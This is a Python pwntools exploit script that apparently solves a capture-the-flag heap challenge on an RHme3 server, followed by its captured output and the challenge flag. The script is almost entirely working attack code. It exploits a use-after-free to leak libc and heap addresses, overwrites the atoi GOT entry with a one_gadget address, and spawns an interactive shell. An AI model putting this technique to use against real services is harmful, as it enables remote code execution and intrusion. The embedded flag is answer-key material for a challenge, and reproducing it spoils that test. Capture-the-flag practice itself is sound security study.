#!/usr/bin/env python
from pwn import *

local = False

r = remote('localhost', 1337) if local else remote('pwn.rhme.riscure.com', 1337)

def addPlayer(name, attack, defense, speed, precision):
	r.sendlineafter(':', '1')
	r.sendlineafter(':', name)
	r.sendlineafter(':', attack)
	r.sendlineafter(':', defense)
	r.sendlineafter(':', speed)
	r.sendlineafter(':', precision)

def removePlayer(index):
	r.sendlineafter(':', '2')
	r.sendlineafter(':', index)

def selectPlayer(index):
	r.sendlineafter(':', '3')
	r.sendlineafter(':', index)

def editName(name):
	r.sendlineafter(':', '4')
	r.sendlineafter(':', '1')
	r.sendlineafter(':', name)
	r.sendlineafter(':', '0')

def leakLibc():
	r.sendlineafter(':', '5')
	r.recvuntil('Name: ')
	return "0x{}".format(hex(u64(r.recv(8).ljust(8, '\00')))[5:])

def leakHeap():
	r.sendlineafter(':', '5')
	r.recvuntil('Name: ')
	r.recvuntil('A/D/S/P: ')
	return int(r.recv(8))

addPlayer('A' * 128, '', '', '', '')
addPlayer('B' * 128, '', '', '', '')
selectPlayer('0')
removePlayer('0')
removePlayer('1')

libc_leaked_addr = leakLibc()
libc_base_addr = int(libc_leaked_addr, 16) - 0x3c4b78

log.info('Libc base addr: ' + hex(libc_base_addr))

addPlayer('A' * 8, '', '', '', '')
selectPlayer('0')
removePlayer('0')

leak_heap_addr = leakHeap()

log.info('Leaked heap addr: ' + hex(leak_heap_addr))

atoi_got_addr = 0x603110
one_gadget_addr = libc_base_addr + 0xf1117

addPlayer('A' * 48, '', '', '', '')

selectPlayer('0')
removePlayer('0')

editName(p64(leak_heap_addr + 0x10))

addPlayer('B' * 16 + p64(atoi_got_addr), '', '', '', '')
editName(p64(one_gadget_addr))

r.interactive()

'''
[+] Opening connection to pwn.rhme.riscure.com on port 1337: Done
[*] Libc base addr: 0x7f322fb3b000
[*] Leaked heap addr: 0xe61630
[*] Switching to interactive mode
 0.- Exit
1.- Add player
2.- Remove player
3.- Select player
4.- Edit player
5.- Show player
6.- Show team
Your choice: 0.- Go back
1.- Edit name
2.- Set attack points
3.- Set defense points
4.- Set speed
5.- Set precision
Your choice: Enter new name: 0.- Go back
1.- Edit name
2.- Set attack points
3.- Set defense points
4.- Set speed
5.- Set precision
Your choice: $ 
$ cat flag
RHME3{h3ap_0f_tr0uble?}
'''